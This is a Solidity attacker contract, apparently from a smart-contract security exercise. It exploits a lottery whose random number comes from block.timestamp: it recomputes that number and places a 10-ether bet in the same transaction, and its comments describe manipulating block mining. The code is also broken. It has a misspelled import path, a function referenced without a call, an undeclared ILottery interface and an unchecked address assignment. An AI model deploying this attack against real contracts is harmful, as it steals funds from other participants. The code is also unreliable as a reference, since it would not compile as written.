// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import '@oppenzeppelin/contracts/access/Ownable.sol';

contract LotteryAttacker is Ownable {
  ILottery private victim;

  constructor(address _victim) {
    victim = _victim;
  }

  // mimic pseudoRandom
  // call pseudoRandom and placebet in same transaction
  //
  // set mining mode to manual
  // manipulate blocks to incude both in the same one
  // minin interval: 3000
  function attack() external payable {
    uint8 winningNumber = pseudoRandom;
    victim.placeBet{ value: 10 ether }(winningNumber);
  }

  function pseudoRandom() private view returns (uint8) {
    return uint8(uint256(keccak256(abi.encode(block.timestamp))) % 254) + 1;
  }
}